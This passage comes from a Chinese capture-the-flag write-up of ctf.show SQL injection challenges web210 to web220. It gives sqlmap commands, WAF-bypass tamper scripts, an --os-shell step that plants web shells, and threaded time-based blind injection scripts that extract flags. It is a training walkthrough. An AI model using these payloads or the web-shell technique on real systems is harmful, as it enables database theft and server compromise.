python sqlmap.py -u "http://c58459cd-860c-4305-97d6-d07cb10dc4d4.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://c58459cd-860c-4305-97d6-d07cb10dc4d4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow210sqlmap -D ctfshow_web --tables
```

<img src="\images\article_images\image-20250829145637399.png" alt="image-20250829145637399" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://c58459cd-860c-4305-97d6-d07cb10dc4d4.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://c58459cd-860c-4305-97d6-d07cb10dc4d4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow210sqlmap -D ctfshow_web -T ctfshow_flavi --columns
```

<img src="\images\article_images\image-20250829145705804.png" alt="image-20250829145705804" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://c58459cd-860c-4305-97d6-d07cb10dc4d4.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://c58459cd-860c-4305-97d6-d07cb10dc4d4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow210sqlmap -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump
```

<img src="\images\article_images\image-20250829145735940.png" alt="image-20250829145735940" style="zoom:25%;" />

&nbsp;



---

# web211

```sql
--tamper 的5体验


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0,1;";
      
      
返回逻辑
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match('/ /', $str);
}
```

**增加了对空格的过滤**

&nbsp;



**自定义脚本 `ctfshow211sqlmap.py`**

```python
#!/usr/bin/env python
#ctfshow211 by AlgoZZi
#ctfshow211sqlmap.py

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
import base64

__priority__ = PRIORITY.LOW

def dependencies():
    # 加载依赖时提示，仅显示一次
    singleTimeWarnMessage("自定义 tamper 脚本已加载")

def tamper(payload, **kwargs):
    """
    自定义 tamper 脚本
    功能说明：
        1. 对 payload 进行双重编码和逆序处理
        2. 具体流程：
            - 使用 "/**/" 绕过空格过滤
            - 将 payload 转为字节串
            - 先整体逆序
            - Base64 编码
            - 再次逆序
            - 再次 Base64 编码
            - 最终输出字符串形式
    用途：
        用于在 SQL 注入过程中对 payload 进行混淆编码，
        以绕过部分基于特征的安全检测。
    """

    retVal = payload

    if payload:
        # 使用 "/**/" 绕过空格过滤
        retVal = retVal.replace(" ", "/**/")
        # 转为字节串
        retVal = retVal.encode()
        # 第一次逆序
        retVal = retVal[::-1]
        # 第一次 Base64 编码
        retVal = base64.b64encode(retVal)
        # 第二次逆序
        retVal = retVal[::-1]
        # 第二次 Base64 编码
        retVal = base64.b64encode(retVal)
        # 转回字符串输出
        retVal = retVal.decode()

    return retVal
```



&nbsp;



```powershell
python sqlmap.py -u "http://e58ad50a-0553-4a24-8033-e233f86876f0.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://e58ad50a-0553-4a24-8033-e233f86876f0.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow211sqlmap -D ctfshow_web --tables
```

<img src="\images\article_images\image-20250829150339636.png" alt="image-20250829150339636" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://e58ad50a-0553-4a24-8033-e233f86876f0.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://e58ad50a-0553-4a24-8033-e233f86876f0.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow211sqlmap -D ctfshow_web -T ctfshow_flavia --columns
```

<img src="\images\article_images\image-20250829150407738.png" alt="image-20250829150407738" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://e58ad50a-0553-4a24-8033-e233f86876f0.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://e58ad50a-0553-4a24-8033-e233f86876f0.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow211sqlmap -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump
```

<img src="\images\article_images\image-20250829150434487.png" alt="image-20250829150434487" style="zoom:25%;" />

&nbsp;



---

# web212

```sql
--tamper 的6体验


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0,1;";
      
      
返回逻辑
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match('/ |\*/', $str);
}
```

**过滤了 `空格`、`*`**

&nbsp;



**自定义脚本 `ctfshow212sqlmap.py`**

```python
#!/usr/bin/env python
#ctfshow212 by AlgoZZi
#ctfshow212sqlmap.py

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
import base64

__priority__ = PRIORITY.LOW

def dependencies():
    # 依赖加载时提示，仅显示一次
    singleTimeWarnMessage("自定义 tamper 脚本已加载")

def tamper(payload, **kwargs):
    """
    自定义 tamper 脚本
    功能说明：
        1. 通过 bypass() 函数，将 payload 中的空格替换为制表符 (TAB, chr(0x09))
           —— 常用于绕过对空格和 * 的过滤
        2. 对替换后的 payload 进行多层混淆处理：
            - 将 payload 转为字节串
            - 整体逆序一次
            - Base64 编码一次
            - 再次逆序
            - 再次 Base64 编码
            - 最终转回字符串输出
    用途：
        用于在 SQL 注入过程中，对 payload 进行特殊字符替换和多层编码，
        以绕过 WAF 或定制化的安全检测规则。
    """

    # 先替换空格为制表符
    payload = bypass(payload)

    retVal = payload
    # 转为字节串
    retVal = retVal.encode()
    # 第一次逆序
    retVal = retVal[::-1]
    # 第一次 Base64 编码
    retVal = base64.b64encode(retVal)
    # 第二次逆序
    retVal = retVal[::-1]
    # 第二次 Base64 编码
    retVal = base64.b64encode(retVal)
    # 转回字符串
    retVal = retVal.decode()

    return retVal


def bypass(payload):
    """
    bypass 函数
    功能：
        遍历 payload，每当遇到空格字符 " " 时，
        替换为 chr(0x09) —— 制表符 TAB
        其他字符保持不变。
    """

    retVal = ""
    for i in range(len(payload)):
        if payload[i] == " ":
            retVal += chr(0x09)
        else:
            retVal += payload[i]

    return retVal
```

&nbsp;



```powershell
python sqlmap.py -u "http://617c81df-36f9-45e8-9aee-16cad9d2d20e.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://617c81df-36f9-45e8-9aee-16cad9d2d20e.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow212sqlmap -D ctfshow_web --tables
```

<img src="\images\article_images\image-20250829151453253.png" alt="image-20250829151453253" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://617c81df-36f9-45e8-9aee-16cad9d2d20e.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://617c81df-36f9-45e8-9aee-16cad9d2d20e.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow212sqlmap -D ctfshow_web -T ctfshow_flavis --columns
```

<img src="\images\article_images\image-20250829151712721.png" alt="image-20250829151712721" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://617c81df-36f9-45e8-9aee-16cad9d2d20e.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://617c81df-36f9-45e8-9aee-16cad9d2d20e.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow212sqlmap -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa --dump
```

<img src="\images\article_images\image-20250829151802884.png" alt="image-20250829151802884" style="zoom:25%;" />

&nbsp;



---

# web213

```sql
练习使用--os-shell 一键getshell


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0,1;";
      
      
返回逻辑
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match('/ |\*/', $str);
}
```

**过滤了 `空格`、`*`**

&nbsp;



**`--os-shell`**

**1.`--os-shell` 的本质**

在 sqlmap 或手工利用中，**`--os-shell`** 并不是直接提供一个系统 shell，而是通过数据库权限绕路去获取命令执行。
其典型方式就是 —— **往服务器写入两个 WebShell 文件**：

- **命令执行型 WebShell**：例如 `cmd.php`，可以让攻击者通过访问页面并传参执行系统命令（`system()`, `exec()` 等）。
- **文件上传型 WebShell**：例如 `upload.php`，提供上传文件功能，进一步落地木马或工具。

这类利用能否成功，完全取决于数据库账号的 **文件写权限** + **Web 路径的可控性**。

**2.MySQL 导入导出与 `secure_file_priv` 的作用**

在 MySQL 里，如果要利用 `--os-shell` 写文件，通常依赖于以下语句：

```sql
SELECT ... INTO OUTFILE '/var/www/html/shell.php';
```

或者

```sql
LOAD DATA INFILE '/tmp/file.txt' INTO TABLE ...
```

这里是否能写文件，就由参数 **`secure_file_priv`** 控制：

- **`secure_file_priv = NULL`**
  - 表示完全禁止 **导入导出** 文件。
  - 攻击者无法通过 `INTO OUTFILE` 写入 WebShell。
- **`secure_file_priv = /some/path/`** （某个具体目录）
  - 表示仅允许在这个目录下导入/导出文件。
  - 如果这个目录 **不在 Web 服务根目录下**，攻击者写入的 WebShell 无法被访问。
  - 但是攻击者仍可导出数据到该目录（数据外泄）。
- **`secure_file_priv = ''`（空值）**
  - 表示没有限制，可以在 **任意目录** 下导入/导出文件。
  - 这是最危险的情况，攻击者可直接写到网站根目录，获取 WebShell。



&nbsp;



```powershell
python sqlmap.py -u "http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --data "id=1" --referer="ctf.show" --safe-url="http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow212sqlmap --os-shell
```

&nbsp;



**对于目标网站执行的脚本语言   -->   选择 [4] PHP**

**对于 WebShell 写向地址	      -->	选择 [1] commom loaction(s)**

> - **[1] common location(s) (默认)**
>   - sqlmap 会尝试一批常见的 Web 根目录（例如 `/var/www/html/`、`/srv/www/htdocs/` 等）。
>   - 如果靶机是常规 `Linux + Nginx/Apache`，选这个大多数情况能成功。
> - **[2] custom location(s)**
>   - 手动输入一个路径（例如知道网站真实路径 `/home/ctf/web/`）。
>   - 适合已知路径的情况。
> - **[3] custom directory list file**
>   - 提供一个包含很多可能路径的文件，sqlmap 会逐个尝试。
>   - 适合你自己收集了目录字典时。
> - **[4] brute force search**
>   - sqlmap 会尝试暴力枚举目录，效率低，噪音大。
>   - 一般不推荐（CTF 或靶机可以试，真实环境容易被发现）。

&nbsp;



<img src="\images\article_images\image-20250829161241567.png" alt="image-20250829161241567" style="zoom:25%;" />

&nbsp;



**获得交互式 shell**

<img src="\images\article_images\image-20250829161741611.png" alt="image-20250829161741611" style="zoom: 25%;" />

&nbsp;



---

# web214

```sql
开始基于时间盲注


查询语句
//无
   
   
返回逻辑
//屏蔽危险分子
```

&nbsp;



**查看js代码可知， `/api/`提交了两个参数：`ip` 和 `debug`，这两个即为注入点**

<img src="\images\article_images\image-20250829170925576.png" alt="image-20250829170925576" style="zoom: 25%;" />

&nbsp;



**经过测试，当 `debug=1` 时，页面有回显**

<img src="\images\article_images\image-20250829171152161.png" alt="image-20250829171152161" style="zoom: 25%;" />

&nbsp;



**查看表名**

<img src="\images\article_images\image-20250829175153832.png" alt="image-20250829175153832" style="zoom:80%;" />

&nbsp;



**查看字段**

<img src="\images\article_images\image-20250829175258951.png" alt="image-20250829175258951" style="zoom:80%;" />

&nbsp;



**查看flag**

<img src="\images\article_images\image-20250829174735829.png" alt="image-20250829174735829" style="zoom:80%;" />

&nbsp;



```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# ===================== 配置区 =====================
URL = "http://af1db6b8-59e4-4070-a9ad-4f25c2ccff86.challenge.ctf.show/api/"
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz{}-_," # 字符集要齐全
MAX_LEN = 50        # 最大爆破长度，避免无限循环
THREADS = 10        # 使用的线程数，代表同时测试多少个字符
DEBUG = False       # 调试开关，设为True会打印详细调试信息（比如每次尝试的字符和耗时）
TIME_THRESHOLD = 1  # 响应时间超过多少秒判定为正确字符
SLEEP_TIME = 1      # payload中sleep的秒数

# ★ payload格式
# 查数据库
# TARGET_QUERY = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

# 查列名
# TARGET_QUERY = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"

# 查数据
TARGET_QUERY = "select flaga from ctfshow_flagx"
PAYLOAD_TEMPLATE = "if(ascii(substr(({query}),{pos},1))=ascii('{char}'),sleep({sleep}),1)"
# =================== 配置区结束 ===================

def test_char(session, pos, ch):
    """测试某一位的某个字符"""
    payload = PAYLOAD_TEMPLATE.format(query=TARGET_QUERY, pos=pos, char=ch, sleep=SLEEP_TIME)
    data = {
        'ip': payload,
        'debug': '0'
    }
    
    start = time.time()
    try:
        session.post(url=URL, data=data, timeout=SLEEP_TIME + 2)
    except requests.exceptions.RequestException:
        pass  # 超时异常表明sleep被执行了
    
    elapsed = time.time() - start
    if DEBUG:
        print(f"[DEBUG] pos={pos}, try='{ch}', time={elapsed:.2f}s")
    
    if elapsed >= TIME_THRESHOLD:
        return ch
    return None

def extract_flag():
    flag = ""
    session = requests.Session()
    
    for i in range(1, MAX_LEN + 1):
        found = None
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {executor.submit(test_char, session, i, ch): ch for ch in CHARSET}
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    found = result
                    # 找到正确字符后取消其他任务
                    for f in futures:
                        f.cancel()
                    break
        
        if found:
            flag += found
            print(f"[+] 当前进度: {flag}")
        else:
            print("[*] 爆破结束")
            break
    
    return flag

if __name__ == "__main__":
    result = extract_flag()
    print(f"\n最终结果: {result}")
```

&nbsp;



---

# web215

```sql
开始基于时间盲注


查询语句
//用了单引号
   
   
返回逻辑
//屏蔽危险分子
```

&nbsp;



**抓包后测试，可以实现延时**

```sql
ip=1' or sleep(3)#&debug=1
```

<img src="\images\article_images\image-20250829210736421.png" alt="image-20250829210736421" style="zoom:25%;" />

&nbsp;



**查看表名**

<img src="\images\article_images\image-20250829211636718.png" alt="image-20250829211636718" style="zoom:80%;" />

&nbsp;



**查看字段**

<img src="\images\article_images\image-20250829211759878.png" alt="image-20250829211759878" style="zoom: 80%;" />

&nbsp;



**查看flag**

<img src="\images\article_images\image-20250829211941049.png" alt="image-20250829211941049" style="zoom:80%;" />

&nbsp;



```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# ===================== 配置区 =====================
URL = "http://7546bdb5-a263-437f-817a-87da2f7de997.challenge.ctf.show/api/"
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz{}-_," # 字符集要齐全
MAX_LEN = 50        # 最大爆破长度，避免无限循环
THREADS = 10        # 使用的线程数，代表同时测试多少个字符
DEBUG = False       # 调试开关，设为True会打印详细调试信息（比如每次尝试的字符和耗时）
TIME_THRESHOLD = 1  # 响应时间超过多少秒判定为正确字符
SLEEP_TIME = 2      # payload中sleep的秒数

# ★ payload格式
# 查数据库
# TARGET_QUERY = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

# 查列名
# TARGET_QUERY = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"

# 查数据
TARGET_QUERY = "select flagaa from ctfshow_flagxc"
PAYLOAD_TEMPLATE = "1' or if(ascii(substr(({query}),{pos},1))=ascii('{char}'),sleep({sleep}),1)#"
# =================== 配置区结束 ===================

def test_char(session, pos, ch):
    """测试某一位的某个字符"""
    payload = PAYLOAD_TEMPLATE.format(query=TARGET_QUERY, pos=pos, char=ch, sleep=SLEEP_TIME)
    data = {
        'ip': payload,      # post参数
        'debug': '0'        # post参数
    }
    
    start = time.time()
    try:
        session.post(url=URL, data=data, timeout=SLEEP_TIME + 2)
    except requests.exceptions.RequestException:
        pass  # 超时异常表明sleep被执行了
    
    elapsed = time.time() - start
    if DEBUG:
        print(f"[DEBUG] pos={pos}, try='{ch}', time={elapsed:.2f}s")
    
    if elapsed >= TIME_THRESHOLD:
        return ch
    return None

def extract_flag():
    flag = ""
    session = requests.Session()
    
    for i in range(1, MAX_LEN + 1):
        found = None
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {executor.submit(test_char, session, i, ch): ch for ch in CHARSET}
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    found = result
                    # 找到正确字符后取消其他任务
                    for f in futures:
                        f.cancel()
                    break
        
        if found:
            flag += found
            print(f"[+] 当前进度: {flag}")
        else:
            print("[*] 爆破结束")
            break
    
    return flag

if __name__ == "__main__":
    result = extract_flag()
    print(f"\n最终结果: {result}")
```

&nbsp;



---

# web216

```sql
开始基于时间盲注


查询语句
       where id = from_base64($id);
   
   
返回逻辑
//屏蔽危险分子
```

**闭合 `from_base64()` 函数即可**

**`1` 经base64处理后为 `MQ==`**

&nbsp;



**查看表名**

<img src="\images\article_images\image-20250829225820222.png" alt="image-20250829225820222" style="zoom:80%;" />

&nbsp;



**查看字段**

<img src="\images\article_images\image-20250829225932720.png" alt="image-20250829225932720" style="zoom:80%;" />

&nbsp;



**查看flag**

<img src="\images\article_images\image-20250829230225310.png" alt="image-20250829230225310" style="zoom:80%;" />



&nbsp;



```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# ===================== 配置区 =====================
URL = "http://63681fa7-d5ab-46e8-925f-001bfe6986da.challenge.ctf.show/api/"
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz{}-_," # 字符集要齐全
MAX_LEN = 50        # 最大爆破长度，避免无限循环
THREADS = 10        # 使用的线程数，代表同时测试多少个字符
DEBUG = False       # 调试开关，设为True会打印详细调试信息（比如每次尝试的字符和耗时）
TIME_THRESHOLD = 1  # 响应时间超过多少秒判定为正确字符
SLEEP_TIME = 2      # payload中sleep的秒数

# ★ payload格式
# 查数据库
# TARGET_QUERY = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

# 查列名
# TARGET_QUERY = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"

# 查数据
TARGET_QUERY = "select flagaac from ctfshow_flagxcc"
PAYLOAD_TEMPLATE = "'MQ==') or if(ascii(substr(({query}),{pos},1))=ascii('{char}'),sleep({sleep}),1)#"
# =================== 配置区结束 ===================

def test_char(session, pos, ch):
    """测试某一位的某个字符"""
    payload = PAYLOAD_TEMPLATE.format(query=TARGET_QUERY, pos=pos, char=ch, sleep=SLEEP_TIME)
    data = {
        'ip': payload,      # post参数
        'debug': '0'        # post参数
    }
    
    start = time.time()
    try:
        session.post(url=URL, data=data, timeout=SLEEP_TIME + 2)
    except requests.exceptions.RequestException:
        pass  # 超时异常表明sleep被执行了
    
    elapsed = time.time() - start
    if DEBUG:
        print(f"[DEBUG] pos={pos}, try='{ch}', time={elapsed:.2f}s")
    
    if elapsed >= TIME_THRESHOLD:
        return ch
    return None

def extract_flag():
    flag = ""
    session = requests.Session()
    
    for i in range(1, MAX_LEN + 1):
        found = None
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {executor.submit(test_char, session, i, ch): ch for ch in CHARSET}
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    found = result
                    # 找到正确字符后取消其他任务
                    for f in futures:
                        f.cancel()
                    break
        
        if found:
            flag += found
            print(f"[+] 当前进度: {flag}")
        else:
            print("[*] 爆破结束")
            break
    
    return flag

if __name__ == "__main__":
    result = extract_flag()
    print(f"\n最终结果: {result}")
```

&nbsp;



---

# web217

```sql
开始基于时间盲注


查询语句
       where id = ($id);
   
   
返回逻辑
//屏蔽危险分子
    function waf($str){
        return preg_match('/sleep/i',$str);
    }
```

&nbsp;



**`benchmark` 函数**

1. 基本语法

```sql
BENCHMARK(loop_count, expression)
```

- **作用**：把 `expression` 这个表达式执行 `loop_count` 次，然后返回 `0`。
- **特点**：
  - 返回值总是 `0`。
  - **主要用途是耗时**（用来测试数据库性能，或者在注入里“拖延时间”）。

2. 举例说明

```sql
SELECT BENCHMARK(1000000, MD5('test'));
```

含义：计算 `MD5('test')` 一百万次。

- 执行起来非常慢，数据库 CPU 飙高。
- 最终返回 `0`。

&nbsp;



**查看表名**

<img src="\images\article_images\image-20250829235407210.png" alt="image-20250829235407210" style="zoom:80%;" />

&nbsp;



**查看字段**

<img src="\images\article_images\image-20250829235743971.png" alt="image-20250829235743971" style="zoom:80%;" />

&nbsp;



**查看flag**

<img src="\images\article_images\image-20250830000202252.png" alt="image-20250830000202252" style="zoom:80%;" />

&nbsp;



```py
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# ===================== 配置区 =====================
URL = "http://bf1e7246-382d-496d-b1a5-8bc2dc767ab5.challenge.ctf.show/api/"
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz{}-_," # 字符集要齐全
MAX_LEN = 50        # 最大爆破长度，避免无限循环
THREADS = 10        # 使用的线程数，代表同时测试多少个字符
DEBUG = False       # 调试开关，设为True会打印详细调试信息（比如每次尝试的字符和耗时）
TIME_THRESHOLD = 0.5  # 响应时间超过多少秒判定为正确字符
# SLEEP_TIME = 2      # payload中sleep的秒数
BENCHMARK_COUNT = "10000000"  # benchmark计算量

# ★ payload格式
# 查数据库
# TARGET_QUERY = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

# 查列名
# TARGET_QUERY = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'"

# 查数据
TARGET_QUERY = "select flagaabc from ctfshow_flagxccb"
PAYLOAD_TEMPLATE = "1) or if(ascii(substr(({query}),{pos},1))=ascii('{char}'),benchmark({count},sha(1)),1)#"
# =================== 配置区结束 ===================

def test_char(session, pos, ch):
    """测试某一位的某个字符"""
    payload = PAYLOAD_TEMPLATE.format(query=TARGET_QUERY, pos=pos, char=ch, count=BENCHMARK_COUNT)
    data = {
        'ip': payload,      # post参数
        'debug': '0'        # post参数
    }
    
    start = time.time()
    try:
        # session.post(url=URL, data=data, timeout=SLEEP_TIME + 2)
        session.post(url=URL, data=data, timeout=TIME_THRESHOLD + 5)
    except requests.exceptions.RequestException:
        pass  # 超时异常表明sleep被执行了
    
    elapsed = time.time() - start
    if DEBUG:
        print(f"[DEBUG] pos={pos}, try='{ch}', time={elapsed:.2f}s")
    
    if elapsed >= TIME_THRESHOLD:
        return ch
    return None

def extract_flag():
    flag = ""
    session = requests.Session()
    
    for i in range(1, MAX_LEN + 1):
        found = None
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {executor.submit(test_char, session, i, ch): ch for ch in CHARSET}
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    found = result
                    # 找到正确字符后取消其他任务
                    for f in futures:
                        f.cancel()
                    break
        
        if found:
            flag += found
            print(f"[+] 当前进度: {flag}")
        else:
            print("[*] 爆破结束")
            break
    
    return flag

if __name__ == "__main__":
    result = extract_flag()
    print(f"\n最终结果: {result}")
```

&nbsp;



---

# web218

```sql
开始基于时间盲注


查询语句
       where id = ($id);
   
   
返回逻辑
//屏蔽危险分子
    function waf($str){
        return preg_match('/sleep|benchmark/i',$str);
    }
```

&nbsp;



**笛卡尔积**

1. 笛卡尔积定义

在数据库中，**笛卡尔积**指的是在没有任何连接条件的情况下，把两张表的所有记录进行两两组合，生成的结果集。

换句话说：

- 如果表 A 有 `m` 行，表 B 有 `n` 行；
- 那么 `A × B` 的结果就是 `m * n` 行。

这是数学里笛卡尔积的概念在 SQL 里的体现。

2. SQL 示例

假设有两张表：

**表 student**

| id   | name |
| ---- | ---- |
| 1    | 张三 |
| 2    | 李四 |

**表 course**

| id   | cname  |
| ---- | ------ |
| 101  | 数学   |
| 102  | 英语   |
| 103  | 计算机 |

查询笛卡尔积

```sql
SELECT *
FROM student, course;
```

或等价写法：

```sql
SELECT *
FROM student CROSS JOIN course;
```

结果

| id   | name | id   | cname  |
| ---- | ---- | ---- | ------ |
| 1    | 张三 | 101  | 数学   |
| 1    | 张三 | 102  | 英语   |
| 1    | 张三 | 103  | 计算机 |
| 2    | 李四 | 101  | 数学   |
| 2    | 李四 | 102  | 英语   |
| 2    | 李四 | 103  | 计算机 |

结果有 `2 × 3 = 6` 行。

3. 笛卡尔积的用途

- **作为 JOIN 的基础**

  - 笛卡尔积是 SQL 中连接运算的基础。

  - 实际上，`INNER JOIN` 本质就是先做笛卡尔积，然后筛选出满足连接条件的记录。

例如：

```sql
SELECT *
FROM student, course
WHERE student.id = course.id;
```

这里就是在笛卡尔积的结果里加了 `WHERE` 条件，才变成有意义的连接。

- **生成组合**
  - 有时我们需要所有可能的组合情况（比如试卷题库出题组合、投资组合），笛卡尔积可以直接拿来用。

&nbsp;



**查看表名**

<img src="\images\article_images\image-20250830173433429.png" alt="image-20250830173433429" style="zoom:25%;" />

&nbsp;



**查看字段**

<img src="\images\article_images\image-20250830173353600.png" alt="image-20250830173353600" style="zoom:25%;" />

&nbsp;



**查看flag**

<img src="\images\article_images\image-20250830174028617.png" alt="image-20250830174028617" style="zoom:25%;" />

&nbsp;





```python
import requests
import time

# ===================== 配置区 =====================

url = 'http://e0128c90-5547-45f7-9e77-98236aedee81.challenge.ctf.show/api/'  # 目标 URL
flagstr = 'asdfghjklqwertyuiopzxcvbnm1234567890-_{},'  # 可用字符集
max_len = 50  # 需要爆破的最大长度
timeout = 0.20  # 请求超时时间（秒）

# 查数据库
# query = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

# 查列名
# query = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"

# 查数据
query = "select flagaac from ctfshow_flagxc"  # 用于爆 flag 的查询

# ===================== 配置区结束 =====================

flag = ''

# 爆破过程
for i in range(1, max_len + 1):
    found = False  # 标记是否找到字符
    for x in flagstr:
        # 构造 payload
        payload = f"if(substr(({query}),{i},1)='{x}',(select count(*) from information_schema.columns A,information_schema.columns B),1)"

        data = {'ip': payload, 'debug': 1}  # 将 payload 放入 data 参数
        
        try:
            # 发送 POST 请求
            res = requests.post(url=url, data=data, timeout=timeout)
        except requests.exceptions.RequestException:
            flag += x  # 如果超时则认为是正确字符
            found = True  # 找到正确字符
            
            # 输出当前进度
            print(f"[+] 当前进度: {flag}")
            break
    
    if not found:
        print("[*] 爆破结束")
        break

# 输出最终结果
print(f"\n最终结果: {flag}")

```

&nbsp;



---

# web219

```sql
开始基于时间盲注


查询语句
       where id = ($id);
   
   
返回逻辑
//屏蔽危险分子
    function waf($str){
        return preg_match('/sleep|benchmark|rlike/i',$str);
    }  
```

&nbsp;



**查看表名**

<img src="\images\article_images\image-20250830174919788.png" alt="image-20250830174919788" style="zoom:25%;" />

&nbsp;



**查看字段**

<img src="\images\article_images\image-20250830175032730.png" alt="image-20250830175032730" style="zoom:25%;" />

&nbsp;



**查看flag**

<img src="\images\article_images\image-20250830175300371.png" alt="image-20250830175300371" style="zoom:25%;" />

&nbsp;



```python
import requests
import time

# ===================== 配置区 =====================

url = 'http://eb3a9157-fffc-4934-8a38-c7313906f92f.challenge.ctf.show/api/'  # 目标 URL
flagstr = 'asdfghjklqwertyuiopzxcvbnm1234567890-_{},'  # 可用字符集
max_len = 50  # 需要爆破的最大长度
timeout = 0.20  # 请求超时时间（秒）

# 查数据库
#query = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

# 查列名
query = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxca'"

# 查数据
#query = "select flagaabc from ctfshow_flagxca"  # 用于爆 flag 的查询

# ===================== 配置区结束 =====================

flag = ''

# 爆破过程
for i in range(1, max_len + 1):
    found = False  # 标记是否找到字符
    for x in flagstr:
        # 构造 payload
        payload = f"if(substr(({query}),{i},1)='{x}',(select count(*) from information_schema.columns A,information_schema.columns B),1)"

        data = {'ip': payload, 'debug': 1}  # 将 payload 放入 data 参数
        
        try:
            # 发送 POST 请求
            res = requests.post(url=url, data=data, timeout=timeout)
        except requests.exceptions.RequestException:
            flag += x  # 如果超时则认为是正确字符
            found = True  # 找到正确字符
            
            # 输出当前进度
            print(f"[+] 当前进度: {flag}")
            break
    
    if not found:
        print("[*] 爆破结束")
        break

# 输出最终结果
print(f"\n最终结果: {flag}")
```

&nbsp;



---

# web220

```sql
开始基于时间盲注


查询语句
       where id = ($id);
   
   
返回逻辑
//屏蔽危险分子
function waf($str){
        return preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);
    } 
```

**`substr` 用 `left` 代替**

&nbsp;



**`LEFT()` 字符串函数**

作用：从一个字符串的左边取指定长度的子串。

**语法：**

```sql
LEFT(str, length)
```

- `str`：要截取的字符串。
- `length`：要截取的字符数。

&nbsp;



**查看flag**

<img src="\images\article_images\image-20250831233723349.png" alt="image-20250831233723349" style="zoom: 33%;" />

&nbsp;





```python
import requests
import time
